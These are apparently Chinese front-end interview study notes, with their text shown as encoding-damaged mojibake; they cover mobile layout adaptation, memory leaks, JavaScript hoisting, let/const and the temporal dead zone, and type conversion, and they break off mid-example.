## å¹³æ—¶å¦‚ä½•è¿›è¡Œå­¦ä¹ çš„

## ç›®å‰åœ¨å­¦ä¹ ä»€ä¹ˆ

## [åˆ—ä¸¾ä¸€ä¸‹ç§»åŠ¨ç«¯é€‚é…æ–¹æ¡ˆ](https://www.jianshu.com/p/2c33921d5a68)

### rem

**rem**æ˜¯ç›¸å¯¹é•¿åº¦å•ä½ï¼Œremæ–¹æ¡ˆä¸­çš„æ ·å¼è®¾è®¡ä¸ºç›¸å¯¹äº**æ ¹å…ƒç´ **`font-size`è®¡ç®—å€¼çš„å€æ•°ã€‚æ ¹æ® **å±å¹•å®½åº¦** è®¾ç½®`html`æ ‡ç­¾çš„`font-size`ï¼Œåœ¨å¸ƒå±€æ—¶ä½¿ç”¨ **rem** å•ä½å¸ƒå±€ï¼Œè¾¾åˆ°è‡ªé€‚åº”çš„ç›®çš„ï¼Œæ˜¯ **å¼¹æ€§å¸ƒå±€** çš„ä¸€ç§å®ç°æ–¹å¼ã€‚

**å®ç°è¿‡ç¨‹ï¼š**  é¦–å…ˆè·å–æ–‡æ¡£æ ¹å…ƒç´ å’Œè®¾å¤‡`dpr`ï¼Œè®¾ç½® **rem**ï¼Œåœ¨`html`æ–‡æ¡£åŠ è½½å’Œè§£æå®Œæˆåè°ƒæ•´`body`å­—ä½“å¤§å°ï¼› åœ¨é¡µé¢**ç¼©æ”¾ / å›é€€ / å‰è¿›**çš„æ—¶å€™ï¼Œ è·å–å…ƒç´ çš„å†…éƒ¨å®½åº¦ (ä¸åŒ…æ‹¬å‚ç›´æ»šåŠ¨æ¡ï¼Œè¾¹æ¡†å’Œå¤–è¾¹è·)ï¼Œé‡æ–°è°ƒæ•´ **rem** å¤§å°ã€‚

### vh/vwæ–¹æ¡ˆ

#### åŸç†

**è§†å£**æ˜¯æµè§ˆå™¨ä¸­ç”¨äºå‘ˆç°ç½‘é¡µçš„åŒºåŸŸï¼Œç§»åŠ¨ç«¯çš„è§†å£é€šå¸¸æŒ‡çš„æ˜¯ **å¸ƒå±€è§†å£**

- **vw** : **1vw** ç­‰äº **è§†å£å®½åº¦** çš„ **1%**
- **vh** : **1vh**  ç­‰äº **è§†å£é«˜åº¦** çš„ **1% **
- **vmin** : é€‰å– **vw** å’Œ **vh** ä¸­ **æœ€å°** çš„é‚£ä¸ª
- **vmax** : é€‰å– **vw** å’Œ **vh** ä¸­ **æœ€å¤§** çš„é‚£ä¸ª

### åŸºäºåª’ä½“æŸ¥è¯¢çš„å“åº”å¼è®¾è®¡

## å†…å­˜æ³„éœ²

- æ„å¤–çš„**å…¨å±€å˜é‡**: æ— æ³•è¢«å›æ”¶
- **å®šæ—¶å™¨**: æœªè¢«æ­£ç¡®å…³é—­ï¼Œå¯¼è‡´æ‰€å¼•ç”¨çš„å¤–éƒ¨å˜é‡æ— æ³•è¢«é‡Šæ”¾
- **äº‹ä»¶ç›‘å¬**: æ²¡æœ‰æ­£ç¡®é”€æ¯ (ä½ç‰ˆæœ¬æµè§ˆå™¨å¯èƒ½å‡ºç°)
- **é—­åŒ…**: ä¼šå¯¼è‡´çˆ¶çº§ä¸­çš„å˜é‡æ— æ³•è¢«é‡Šæ”¾
- **dom å¼•ç”¨**: dom å…ƒç´ è¢«åˆ é™¤æ—¶ï¼Œå†…å­˜ä¸­çš„å¼•ç”¨æœªè¢«æ­£ç¡®æ¸…ç©º

å¯ç”¨ chrome ä¸­çš„ timeline è¿›è¡Œå†…å­˜æ ‡è®°ï¼Œå¯è§†åŒ–æŸ¥çœ‹å†…å­˜çš„å˜åŒ–æƒ…å†µï¼Œæ‰¾å‡ºå¼‚å¸¸ç‚¹ã€‚

## çŠ¶æ€ç 304: èµ„æºæœªä¿®æ”¹ï¼Œå¯ä½¿ç”¨ç¼“å­˜

è®²ä¸€ä¸‹åå•†ç¼“å­˜ å¼ºç¼“å­˜

## JavaScript

### jsåŸºç¡€

#### å¼•ç”¨ç±»å‹

##### åŸºæœ¬åŒ…è£…ç±»å‹

ECMAScriptæä¾›äº†ä¸‰ä¸ªåŸºæœ¬åŒ…è£…ç±»å‹ï¼š`Booleanã€Numberã€String`ã€‚

å®é™…ä¸Šï¼Œæ¯å½“è¯»å–ä¸€ä¸ªåŸºæœ¬ç±»å‹å€¼çš„æ—¶å€™ï¼Œåå°å°±ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„åŸºæœ¬åŒ…è£…ç±»å‹çš„å¯¹è±¡ï¼Œä»è€Œè®©æˆ‘ä»¬èƒ½è¿‡è°ƒç”¨ä¸€äº›æ–¹æ³•æ¥æ“ä½œè¿™äº›æ•°æ®ã€‚

å¼•ç”¨ç±»å‹ä¸åŸºæœ¬åŒ…è£…ç±»å‹çš„åŒºåˆ«åœ¨äº**å¯¹è±¡çš„ç”Ÿå­˜æœŸ**ï¼šä½¿ç”¨newæ“ä½œç¬¦åˆ›å»ºçš„å¼•ç”¨ç±»å‹çš„å®ä¾‹ï¼Œåœ¨æ‰§è¡Œæµç¦»å¼€å½“å‰ä½œç”¨åŸŸä¹‹å‰éƒ½ä¸€ç›´ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œè‡ªåŠ¨åˆ›å»ºçš„åŸºæœ¬åŒ…è£…ç±»å‹çš„å¯¹è±¡ï¼Œåˆ™åªå­˜åœ¨äºä¸€è¡Œä»£ç çš„æ‰§è¡Œç¬é—´ï¼Œç„¶åç«‹å³é”€æ¯ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬**ä¸èƒ½åœ¨è¿è¡Œæ—¶ä¸ºåŸºæœ¬ç±»å‹å€¼æ·»åŠ å±æ€§**

åŒ…è£…å¯¹è±¡ : å°±æ˜¯å½“åŸºæœ¬ç±»å‹ä»¥å¯¹è±¡çš„æ–¹å¼å»ä½¿ç”¨æ—¶ï¼Œ*JavaScript* ä¼šè½¬æ¢æˆå¯¹åº”çš„åŒ…è£…ç±»å‹ï¼Œç›¸å½“äº ***new*** ä¸€ä¸ªå¯¹è±¡ï¼Œå†…å®¹å’ŒåŸºæœ¬ç±»å‹çš„å†…å®¹ä¸€æ ·ï¼Œç„¶åå½“æ“ä½œå®Œæˆå†å»è®¿é—®çš„æ—¶å€™ï¼Œè¿™ä¸ªä¸´æ—¶å¯¹è±¡ä¼šè¢«é”€æ¯ï¼Œç„¶åå†è®¿é—®æ—¶å€™å°±æ˜¯ ***undefined***

```js
var str = 'hello';
str.number = 10; //å‡è®¾æˆ‘ä»¬æƒ³ç»™å­—ç¬¦ä¸²æ·»åŠ ä¸€ä¸ªå±æ€§ number ï¼Œåº•å±‚ä¼šæœ‰å¦‚ä¸‹æ­¥éª¤
(
    var _str = new String('hello'); // 1 æ‰¾åˆ°å¯¹åº”çš„åŒ…è£…å¯¹è±¡ç±»å‹ï¼Œç„¶åé€šè¿‡åŒ…è£…å¯¹è±¡åˆ›å»ºå‡ºä¸€ä¸ªå’ŒåŸºæœ¬ç±»å‹å€¼ç›¸åŒçš„å¯¹è±¡
    _str.number = 10; // 2 é€šè¿‡è¿™ä¸ªå¯¹è±¡è°ƒç”¨åŒ…è£…å¯¹è±¡ä¸‹çš„æ–¹æ³• ä½†ç»“æœå¹¶æ²¡æœ‰è¢«ä»»ä½•ä¸œè¥¿ä¿å­˜
    _str =null; // 3 è¿™ä¸ªå¯¹è±¡åˆè¢«é”€æ¯
)
console.log(str.number); // undefined  å½“æ‰§è¡Œåˆ°è¿™ä¸€å¥çš„æ—¶å€™ï¼Œå› ä¸ºåŸºæœ¬ç±»å‹æœ¬æ¥æ²¡æœ‰å±æ€§ï¼Œåå°åˆä¼šé‡æ–°é‡å¤ä¸Šé¢çš„æ­¥éª¤
(
   var str = new String('hello');// 1 æ‰¾åˆ°åŸºæœ¬åŒ…è£…å¯¹è±¡ï¼Œç„¶ååˆæ–°å¼€è¾Ÿä¸€ä¸ªå†…å­˜ï¼Œåˆ›å»ºä¸€ä¸ªå€¼ä¸º hello å¯¹è±¡
   str.number = undefined;// 2 å› ä¸ºåŒ…è£…å¯¹è±¡ä¸‹é¢æ²¡æœ‰ number è¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥åˆä¼šé‡æ–°æ·»åŠ ï¼Œå› ä¸ºæ²¡æœ‰å€¼ï¼Œæ‰€ä»¥å€¼æ˜¯æœªå®šä¹‰;ç„¶åå¼¹å‡ºç»“æœ
   str =null; // 3 è¿™ä¸ªå¯¹è±¡åˆè¢«é”€æ¯
)
```

#### å˜é‡

varã€letã€constæ˜¯JavaScriptå£°æ˜å˜é‡çš„ä¸‰ç§æ–¹å¼ï¼Œå…¶ä¸­letå’Œconstæ˜¯ES6ä¸ºJavaScriptæ–°å¢çš„ä¸¤ç§æ–¹å¼ï¼Œç”¨æ³•ä¸varç±»ä¼¼ã€‚æ›¾ç»é—®åˆ°å®ƒä»¬ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«æ—¶ï¼Œç­”æ¡ˆä¹‹ä¸€å°±æœ‰letå’Œconstä¸å­˜åœ¨å˜é‡æå‡ã€‚ä½†æ˜¯ç»è¿‡ä¸€ç•ªè°ƒæŸ¥ç ”ç©¶ï¼Œå‘ç°è¿™ä¸ªç­”æ¡ˆå¹¶ä¸æ˜¯é‚£ä¹ˆå‡†ç¡®ã€‚

##### å˜é‡æå‡

ä¼—æ‰€å‘¨çŸ¥ï¼Œvarå‘½ä»¤ä¼šå‘ç”Ÿ**å˜é‡æå‡**çš„ç°è±¡ï¼Œå³å˜é‡å¯ä»¥åœ¨å£°æ˜å‰ä½¿ç”¨ï¼š

```javascript
console.log(a); // undefined
var a = 1;
```

è¿™ç§ç°è±¡è¿˜æ˜¯å¾ˆå¥‡æ€ªçš„ï¼Œå› ä¸ºæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘ï¼Œå˜é‡åº”è¯¥åœ¨å£°æ˜è¯­å¥ä¹‹åæ‰å¯ä»¥ä½¿ç”¨ã€‚å…¶å®ï¼ŒJavaScriptä¸å…¶ä»–è¯­è¨€ä¸€æ ·ï¼Œéƒ½éœ€è¦ç»å†ç¼–è¯‘å’Œæ‰§è¡Œé˜¶æ®µã€‚ä½†JavaScriptç¼–è¯‘å™¨åœ¨ç¼–è¯‘é˜¶æ®µä¼šæœé›†æ‰€æœ‰çš„å˜é‡å£°æ˜ï¼Œå¹¶å°†**å˜é‡å£°æ˜**æå‰åˆ°å˜é‡**å½“å‰æ‰€åœ¨ä½œç”¨åŸŸ**çš„é¡¶éƒ¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå˜é‡å£°æ˜åœ¨ç¼–è¯‘é˜¶æ®µå·²ç»æ‰§è¡Œï¼Œè€Œèµ‹å€¼åˆ™åœ¨æ‰§è¡Œé˜¶æ®µæ‰§è¡Œåˆ°å¯¹åº”è¯­å¥æ—¶æ‰ä¼šæ‰§è¡Œã€‚æ‰€ä»¥æ‰ä¼šå‡ºç°æ‰€è°“çš„â€œå˜é‡æå‡â€ã€‚ä¸Šé¢ä»£ç ç­‰ä»·äºï¼š  

```javascript
var a;
console.log(a); // undefined
a = 1;
```

ä¸ºä»€ä¹ˆè¦å¼ºè°ƒå½“å‰å‘¢ï¼Ÿå› ä¸ºES5åˆ†ä¸ºå…¨å±€ä½œç”¨åŸŸå’Œå‡½æ•°ä½œç”¨åŸŸï¼Œä¸åŒä½œç”¨åŸŸä¸­åŒåå˜é‡äº’ä¸å½±å“ã€‚ä¾‹å¦‚ï¼š

```javascript
console.log(b); // ReferenceError: b is not defined
function foo () {
    console.log(b); // undefined
    var b = 1;
}
foo()
```

å½“ä»£ç æ‰§è¡Œæ—¶ï¼Œåœ¨å‡½æ•°ä½œç”¨åŸŸå†…çš„å˜é‡bä¼šè¢«æå‡åˆ°å½“å‰ä½œç”¨åŸŸçš„é¡¶éƒ¨ï¼Œä¹Ÿå°±æ˜¯fooå‡½æ•°å†…çš„é¡¶éƒ¨ï¼Œè€Œä¸æ˜¯æ•´ä½“ä»£ç çš„é¡¶éƒ¨ï¼Œæ‰€ä»¥å‡½æ•°å†…è¾“å‡ºundefinedï¼Œè€Œå‡½æ•°å¤–éƒ¨ä¸å­˜åœ¨å˜é‡bï¼Œæ‰€ä»¥ä¼šæŠ¥ReferenceErroré”™è¯¯ã€‚  

**éšå¼å…¨å±€å˜é‡ä¸ä¼šè¢«æå‡**ï¼š

```JavaScript
function foo () {
    console.log(b) // ReferenceError
    b = 1
    console.log(b) // 1
}
foo()
console.log(b) // 1
```

ä½¿ç”¨varå£°æ˜å˜é‡ï¼Œåœ¨å‡½æ•°å†…éƒ¨æ˜¯å±€éƒ¨å˜é‡ï¼Œåœ¨å‡½æ•°å¤–éƒ¨æ˜¯å…¨å±€å˜é‡ï¼Œæ²¡æœ‰ä½¿ç”¨varå£°æ˜çš„å˜é‡ï¼Œåœ¨å‡½æ•°å†…éƒ¨æˆ–å¤–éƒ¨éƒ½æ˜¯å…¨å±€å˜é‡ï¼Œä½†å¦‚æœæ˜¯åœ¨å‡½æ•°å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå«éšå¼å…¨å±€å˜é‡ï¼Œåœ¨å‡½æ•°å¤–éƒ¨ä½¿ç”¨ä¹‹å‰éœ€è¦å…ˆè°ƒç”¨æ–¹æ³•ï¼Œå‘ŠçŸ¥ç³»ç»Ÿå£°æ˜äº†å…¨å±€å˜é‡åæ–¹å¯åœ¨å‡½æ•°å¤–éƒ¨ä½¿ç”¨ã€‚  

å¦å¤–ï¼Œ**å‡½æ•°å£°æ˜ä¹Ÿä¼šæå‡**ï¼š

```javascript
foo(); // 1
function foo () {
    console.log(1)
}
```

**å‡½æ•°è¡¨è¾¾å¼ä¸ä¼šè¢«æå‡**

```javascript
foo(); // TypeError: foo is not a function
var foo = function () {
    console.log(1)
}
```

è¿™æ˜¯å› ä¸ºJavaScriptç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘é˜¶æ®µ**ä¼˜å…ˆè¯»å–å‡½æ•°å£°æ˜çš„ä»£ç ï¼Œä»¥ç¡®ä¿å‡½æ•°èƒ½å¤Ÿè¢«å¼•ç”¨åˆ°**ï¼›è€Œå¯¹äºå‡½æ•°è¡¨è¾¾å¼ï¼Œåªæœ‰åœ¨æ‰§è¡Œåˆ°ç›¸åº”çš„è¯­å¥æ—¶æ‰è¿›è¡Œè§£æã€‚ä¹Ÿå¯ä»¥è¿™ä¹ˆç†è§£ï¼Œä¸Šè¿°ä»£ç ç›¸å½“äºå£°æ˜äº†ä¸€ä¸ªå˜é‡fooï¼Œç„¶åæŠŠå‡½æ•°èµ‹å€¼ç»™å˜é‡fooï¼Œè€Œå˜é‡æå‡åœ¨æœ€å¼€å§‹ä¹Ÿè¯´è¿‡æ˜¯å°†å˜é‡çš„å£°æ˜æå‡åˆ°é¡¶éƒ¨ï¼Œèµ‹å€¼ä»£ç ç•™åœ¨åŸåœ°ï¼Œæ‰€ä»¥å‡½æ•°è¡¨è¾¾å¼ä¸ä¼šè¢«æå‡ã€‚ç­‰ä»·äºï¼š

```javascript
var foo;
foo();
foo = function () {
    console.log(1)
}
```

**å‡½æ•°æå‡ä¼šä¼˜å…ˆäºå˜é‡æå‡**

```javascript
console.log(foo); // [Function: foo]
var foo = 10;
function foo () {}
```

ä¸Šè¿°ä»£ç ç­‰ä»·äºï¼š

```javascript
function foo () {}
var foo;
console.log(foo);
foo = 10;
```

åŒåå‡½æ•°å’Œå˜é‡ä¸ºä»€ä¹ˆæ²¡æœ‰è¢«è¦†ç›–å‘¢ï¼Ÿ  

è¿™æ˜¯å› ä¸ºå¯¹äºåŒåçš„å˜é‡å£°æ˜ï¼ŒJavascripté‡‡ç”¨çš„æ˜¯å¿½ç•¥åŸåˆ™ï¼Œåå£°æ˜çš„ä¼šè¢«å¿½ç•¥ã€‚å¯¹äºåŒåçš„å‡½æ•°å£°æ˜ï¼ŒJavascripté‡‡ç”¨çš„æ˜¯è¦†ç›–åŸåˆ™ï¼Œå…ˆå£°æ˜çš„ä¼šè¢«è¦†ç›–ã€‚å¯¹äºåŒåçš„å‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜ï¼Œé‡‡ç”¨çš„æ˜¯å¿½ç•¥åŸåˆ™ï¼Œä¸ºäº†ç¡®ä¿å‡½æ•°èƒ½å¤Ÿè¢«å¼•ç”¨åˆ°ï¼Œåœ¨æå‡æ—¶å‡½æ•°å£°æ˜ä¼šæå‡åˆ°å˜é‡å£°æ˜ä¹‹å‰ï¼Œå˜é‡å£°æ˜ä¼šè¢«å¿½ç•¥ï¼Œä½†æ˜¯å˜é‡èµ‹å€¼ä»¥åä¼šè¢«è¦†ç›–ã€‚  

åŒåå˜é‡ï¼š

```javascript
//è§£æå‰
var a = 1;
var a =2;
// è§£æå
var a;
var a; // è¢«å¿½ç•¥
a = 1;
a = 2;
```

åŒåå‡½æ•°:

```javascript
function foo () {
    console.log(1)
}
function foo () { // è¦†ç›–å‰ä¸€ä¸ª
    console.log(2)
}
foo(); // 2
```

åŒåå‡½æ•°å’Œå˜é‡ï¼š

```javascript
// è§£æå‰
console.log(foo); // [Function: foo]
var foo = 10;
function foo () {}
console.log(foo); // 10
// è§£æå
function foo () {}
var foo; // è¢«å¿½ç•¥
console.log(foo);
foo = 10;
console.log(foo); //10
```

##### letå’Œconst

ES6ä¸­ï¼Œä¸ºäº†çº æ­£â€œ**å˜é‡æå‡**â€è¿™ä¸€å¥‡æ€ªç°è±¡ï¼Œletå’Œconstæ”¹å˜äº†è¯­æ³•è¡Œä¸ºï¼Œletå’Œconstæ‰€å£°æ˜çš„å˜é‡å¿…é¡»è¦åœ¨**å£°æ˜å**ä½¿ç”¨ï¼Œå¦åˆ™ä¾¿ä¼šæŠ¥é”™ï¼š

```javascript
console.log(a); // ReferenceError
let a = 1;
```

å¦å¤–ï¼Œletå’Œconstå®é™…ä¸Šä¸ºJavaScriptæ–°å¢äº†å—çº§ä½œç”¨åŸŸçš„æ¦‚å¿µã€‚é€šè¿‡letæˆ–constå£°æ˜çš„å˜é‡åªèƒ½åœ¨å‘½ä»¤æ‰€åœ¨çš„ä»£ç å—å†…æœ‰æ•ˆã€‚

```javascript
let a = 1;
if (true) {
    a = 2; // ReferenceError;
    let a = 3;
}
```

åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œè™½ç„¶ifä»£ç å—å¤–å­˜åœ¨å˜é‡aï¼Œä½†æ˜¯ifä»£ç å—å†…letæœ‰å£°æ˜äº†ä¸€ä¸ªå˜é‡aï¼Œå¯¼è‡´å˜é‡aè¢«ç»‘å®šåœ¨è¿™ä¸ªå—çº§ä½œç”¨åŸŸå†…ï¼Œä¸å—å¤–éƒ¨çš„å½±å“ï¼Œæ‰€ä»¥åœ¨ifä»£ç å—å†…éƒ¨letå£°æ˜å‰ä½¿ç”¨å°±ä¼šæŠ¥é”™ã€‚åŒæ—¶ï¼Œè™½ç„¶**letå’Œconståœ¨ç›¸åŒä½œç”¨åŸŸä¸‹ä¸å…è®¸é‡å¤å£°æ˜**ï¼Œä½†æ˜¯ç”±äºå—çº§ä½œç”¨åŸŸçš„å­˜åœ¨ï¼Œå†…å±‚ä½œç”¨åŸŸä¸å—å¤–å±‚ä½œç”¨åŸŸçš„å½±å“ï¼Œæ‰€ä»¥åœ¨**ä¸åŒä½œç”¨åŸŸ**ä¸‹å¯ä»¥å®šä¹‰åŒåå˜é‡ã€‚

##### letå’Œconstå­˜åœ¨å˜é‡æå‡ä¹ˆï¼Ÿ

å¼„æ˜ç™½äº†å‰ä¸¤ä¸ªå¤§æ¦‚å¿µä»¥åï¼Œæ­£å¼æ¥çœ‹çœ‹è¿™ä¸ªé—®é¢˜ï¼Œé€šè¿‡**æ ‡é¢˜2**ä¸­çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œåœ¨letå£°æ˜å˜é‡å‰ä½¿ç”¨è¯¥å˜é‡ï¼Œä¼šæŠ›å‡ºReferenceErrorçš„é”™è¯¯ï¼Œé‚£ä¹ˆå°±è¯´æ˜letå’Œconstä¸ä¼šè¢«æå‡ä¹ˆï¼Ÿ  

å…¶å®ï¼Œletå’Œconstæ˜¯ä¼šè¢«æå‡çš„ï¼Œå‡†ç¡®çš„è¯´æ˜¯**åˆ›å»ºè¢«æå‡äº†ï¼Œä½†æ˜¯åˆå§‹åŒ–æ²¡æœ‰è¢«æå‡**ã€‚  

æ ¹æ®ECMA-262ä¸­13.3.1çš„NOTEä¸­æ‰€è¿°ï¼š`let and const declarations define variables that are scoped to the running execution contextâ€™s LexicalEnvironment. The variables are created when their containing Lexical Environment is instantiated but may not be accessed in any way until the variableâ€™s LexicalBinding is evaluated. A variable defined by a LexicalBinding with an Initializer is assigned the value of its Initializerâ€™s AssignmentExpression when the LexicalBinding is evaluated, not when the variable is created. If a LexicalBinding in a let declaration does not have an Initializer the variable is assigned the value undefined when the LexicalBinding is evaluated.`  

è¿™æ®µè¯çš„å¤§æ¦‚æ„æ€å°±æ˜¯letå’Œconstå®šä¹‰äº†å˜é‡æ‰§è¡Œçš„è¯æ³•ç¯å¢ƒï¼Œ**å˜é‡ä¼šåœ¨è¿™ä¸ªç¯å¢ƒå®ä¾‹åŒ–æ—¶è¢«åˆ›å»ºï¼Œä½†æ˜¯åœ¨å˜é‡çš„è¯æ³•ç»‘å®šä¹‹å‰ä¸å…è®¸ä»¥ä»»ä½•æ–¹å¼å¯¹å…¶è¿›è¡Œè®¿é—®**......å¦‚æœletå£°æ˜çš„å˜é‡åˆå§‹åŒ–æ—¶æ²¡æœ‰è¯æ³•ç»‘å®šï¼Œåˆ™åˆ†é…ä¸€ä¸ªæœªå®šä¹‰çš„å€¼undefinedï¼ŒåŒæ—¶MDNä¸Šå…³äºletä»‹ç»ä¸­ä¹Ÿè¯´åˆ°` var å’Œ let çš„ä¸åŒä¹‹å¤„åœ¨äºåè€…æ˜¯åœ¨ç¼–è¯‘æ—¶æ‰åˆå§‹åŒ–`ã€‚ï¼ˆè¯æ³•ç¯å¢ƒåº”è¯¥æ˜¯æŒ‡ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè€Œè¯æ³•ç»‘å®šåº”è¯¥å°±æ˜¯èµ‹å€¼æ“ä½œã€‚ï¼‰

ä¹Ÿå°±è¯´å¯ä»¥è¿™ä¹ˆç†è§£ï¼Œ**letå£°æ˜å˜é‡åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š1.åˆ›å»ºï¼Œ2.åˆå§‹åŒ–ï¼Œ3.èµ‹å€¼ã€‚** åˆ›å»ºç¯èŠ‚åœ¨å½“å‰ç¯å¢ƒå®ä¾‹åŒ–æ—¶å®Œæˆã€‚è€Œé€šè¿‡**constå‘½ä»¤å£°æ˜çš„æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œä¸€æ—¦å£°æ˜ï¼Œå¸¸é‡çš„å€¼ï¼ˆå†…å­˜åœ°å€ä¸èƒ½æ”¹å˜ï¼‰å°±ä¸èƒ½æ”¹å˜**  ï¼Œæ‰€ä»¥constå£°æ˜å¿…é¡»ç«‹å³è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸èƒ½ç•™åˆ°ä»¥åèµ‹å€¼ï¼Œæ‰€ä»¥**constå£°æ˜å˜é‡åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š1.åˆ›å»ºï¼Œ2.åˆå§‹åŒ–**ï¼Œæ²¡æœ‰èµ‹å€¼æ“ä½œï¼Œç›¸å½“äºæŠŠåˆå§‹åŒ–èµ‹å€¼æ•´åˆæˆäº†ä¸€æ­¥ï¼Œåœ¨åˆå§‹åŒ–çš„æ—¶å€™è¿›è¡Œèµ‹å€¼ã€‚  

##### æ€»ç»“

æ ¹æ®ä¸Šè¿°ECMA-262ä¸­13.3.1å’ŒMDNæ–‡æ¡£è¿˜æœ‰**æ ‡é¢˜1**ä¸­æ‰€è®²ï¼Œé€šè¿‡varå£°æ˜çš„å˜é‡ï¼Œå˜é‡æå‡æ—¶ç›¸å½“äºæŠŠåˆ›å»ºå’Œåˆå§‹åŒ–è¿›è¡Œäº†æå‡ï¼Œæ²¡æœ‰æå‡èµ‹å€¼æ“ä½œï¼Œå¯ä»¥ç†è§£ä¸º**varå‘½ä»¤å£°æ˜å˜é‡å…¶å®ä¸ºä¸¤éƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†åˆ›å»ºçš„åŒæ—¶è¿›è¡Œåˆå§‹åŒ–ï¼Œç¬¬äºŒéƒ¨åˆ†èµ‹å€¼ã€‚**  æ‰€ä»¥**æ ‡é¢˜1**ä¸­çš„ä»£ç ä¼šè¾“å‡ºundefinedï¼š

```javascript
// é€šè¿‡varå£°æ˜çš„å˜é‡ï¼Œåˆ›å»ºå’Œåˆå§‹åŒ–éƒ½è¿›è¡Œæå‡ï¼Œä¸æå‡èµ‹å€¼æ“ä½œï¼Œæ‰€ä»¥è¢«æå‡ååˆå§‹åŒ–ä¸ºundefined
console.log(a); // undefined
var a = 1;
```

è€Œ**letå’Œconstä»…ä»…æå‡äº†å˜é‡çš„åˆ›å»º**ï¼Œåˆå§‹åŒ–åŠèµ‹å€¼æ“ä½œéƒ½æ²¡æœ‰è¿›è¡Œæå‡

```javascript
if (true) {
    a = 2; // ReferenceError;  
    let a = 3; 
}
```

ä¸ºäº†ç†è§£æ–¹ä¾¿ï¼Œå¯ä»¥å°†ä¸Šè¿°ä»£ç æ‹†åˆ†æˆå¦‚ä¸‹å‡ æ­¥ï¼š

```javascript
if (true) {
    // æ­¤æ—¶açš„åˆ›å»ºå·²ç»è¢«æå‡åˆ°äº†ifä»£ç å—å†…çš„é¡¶éƒ¨
    a = 2; // ReferenceError;  //æ­¤æ—¶å¯¹aè¿›è¡Œèµ‹å€¼ï¼Œç”±äºaä»…ä»…è¢«åˆ›å»ºï¼Œè¿˜æ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œa is not defined
    let aï¼› // å®Œæˆaçš„åˆå§‹åŒ–ï¼Œæ ¹æ®ECMA-262 æ­¤æ—¶aä¸ºundefined
    a = 3; // å®Œæˆå¯¹açš„èµ‹å€¼æ“ä½œã€‚
}
```

è€Œletä»åˆ›å»ºè¢«æå‡åˆ°åˆå§‹åŒ–è¿™ä¸­é—´çš„éƒ¨åˆ†ï¼Œå°±æ˜¯æˆ‘ä»¬å¹³å¸¸æ‰€è¯´çš„**æš‚æ—¶æ€§æ­»åŒº(TDZ)**ï¼Œå³åœ¨ä½¿ç”¨letå‘½ä»¤å£°æ˜å˜é‡åˆå§‹åŒ–ä¹‹å‰ï¼Œè¯¥å˜é‡éƒ½æ˜¯ä¸å¯ç”¨çš„ã€‚

```javascript
if (true) {
    // açš„åˆ›å»ºè¢«æå‡ï¼ŒTDZçš„å¼€å§‹
    a = 2; // ReferenceError;  
    let aï¼› // å®Œæˆaçš„åˆå§‹åŒ–ï¼ŒTDZçš„ç»“æŸ
    a = 3; // å®Œæˆå¯¹açš„èµ‹å€¼æ“ä½œã€‚
}
```

### ç±»å‹è½¬æ¢

ç±»å‹è½¬æ¢å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œ**éšæ€§è½¬æ¢**å’Œ**æ˜¾æ€§è½¬æ¢**

#### æ˜¾æ€§è½¬æ¢

ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»ï¼šæ•°å€¼ç±»å‹ã€å­—ç¬¦ä¸²ç±»å‹ã€å¸ƒå°”ç±»å‹

> ä¸‰å¤§ç±»çš„åŸå§‹ç±»å‹å€¼çš„è½¬æ¢è§„åˆ™æˆ‘å°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œæ›´å¤šè¯¦æƒ…æ–‡ç« é“¾æ¥ğŸ‘‰[juejin.cn/post/695617â€¦](https://juejin.cn/post/6956170676327677966)

#### æ•°å€¼ç±»å‹ï¼ˆå¼•ç”¨ç±»å‹è½¬æ¢ï¼‰

```js
Number({a: 1}) // NaN
Number([1, 2, 3]) // NaN
Number([5]) // 5

ç¬¬ä¸€æ­¥ï¼Œè°ƒç”¨å¯¹è±¡è‡ªèº«çš„`valueOf`æ–¹æ³•ã€‚å¦‚æœè¿”å›åŸå§‹ç±»å‹çš„å€¼ï¼Œåˆ™ç›´æ¥å¯¹è¯¥å€¼ä½¿ç”¨`Number`å‡½æ•°ï¼Œä¸å†è¿›è¡Œåç»­æ­¥éª¤ã€‚

ç¬¬äºŒæ­¥ï¼Œå¦‚æœ`valueOf`æ–¹æ³•è¿”å›çš„è¿˜æ˜¯å¯¹è±¡ï¼Œåˆ™æ”¹ä¸ºè°ƒç”¨å¯¹è±¡è‡ªèº«çš„`toString`æ–¹æ³•ã€‚å¦‚æœ`toString`æ–¹æ³•è¿”å›åŸå§‹ç±»å‹çš„å€¼ï¼Œ
åˆ™å¯¹è¯¥å€¼ä½¿ç”¨`Number`å‡½æ•°ï¼Œä¸å†è¿›è¡Œåç»­æ­¥éª¤ã€‚

ç¬¬ä¸‰æ­¥ï¼Œå¦‚æœ`toString`æ–¹æ³•è¿”å›çš„æ˜¯å¯¹è±¡ï¼Œå°±æŠ¥é”™ã€‚

è¡¥å……ä¸€ç‚¹ï¼š`valueOf`å’Œ`toString`æ–¹æ³•ï¼Œéƒ½æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„
```

#### å­—ç¬¦ä¸²ç±»å‹ï¼ˆå¼•ç”¨ç±»å‹è½¬æ¢ï¼‰

```js
String({a: 1}) // "[object Object]"
String([1, 2, 3]) // "1,2,3"

